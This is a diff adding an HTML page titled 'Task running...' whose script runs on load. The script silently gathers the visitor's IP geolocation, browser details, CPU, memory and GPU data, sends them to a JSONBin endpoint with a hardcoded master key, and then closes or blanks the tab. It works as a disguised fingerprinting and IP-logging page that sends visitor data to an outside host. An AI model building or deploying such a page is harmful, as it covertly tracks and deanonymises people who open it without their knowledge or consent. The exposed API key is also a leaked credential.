@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Task running...</title>
+</head>
+<body>
+<script>
+const API_KEY = "$2a$10$y3KlWspVXbqTlAP272nXdufo/iFEkaSpUj4CMEKBOB7mSvvj30P6G"; 
+const BIN_ID = "68a121b943b1c97be9202e0e";
+
+(async () => {
+  try {
+    const date = new Date().toISOString();
+
+    // Browser info
+    const browserAgent = navigator.userAgent;
+    const browserPlatform = navigator.platform;
+    const browserLanguage = navigator.language;
+    const browserLanguages = navigator.languages;
+    const browserVendor = navigator.vendor;
+    const cpuCores = navigator.hardwareConcurrency;
+    const deviceMemory = navigator.deviceMemory;
+
+    // GPU info
+    const gpu = (() => {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : undefined;
+      } catch(e) { return undefined; }
+    })();
+
+    // IP info
+    const ipapi = await fetch("https://ipapi.co/json/").then(r => r.json());
+
+    // Prepare data
+    const data = {
+      Date: date,
+      ipapiinfo: ipapi,
+      BrowserAgent: browserAgent,
+      BrowserPlatform: browserPlatform,
+      BrowserLanguage: browserLanguage,
+      BrowserLanguages: browserLanguages,
+      BrowserVendor: browserVendor,
+      CpuCores: cpuCores,
+      DeviceMemory: deviceMemory,
+      GPU: gpu
+    };
+
+    // Send to JSONBin
+    await fetch("https://api.jsonbin.io/v3/b", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+        "X-Bin-Name": BIN_ID
+      },
+      body: JSON.stringify(data)
+    });
+
+  } catch(err) {
+    console.error(err);
+  } finally {
+    // Attempt to close tab (works only if opened by script)
+    window.close();
+
+    // Instant fallback redirect
+    window.location.href = "about:blank";
+  }
+})();
+</script>
+</body>
+</html>
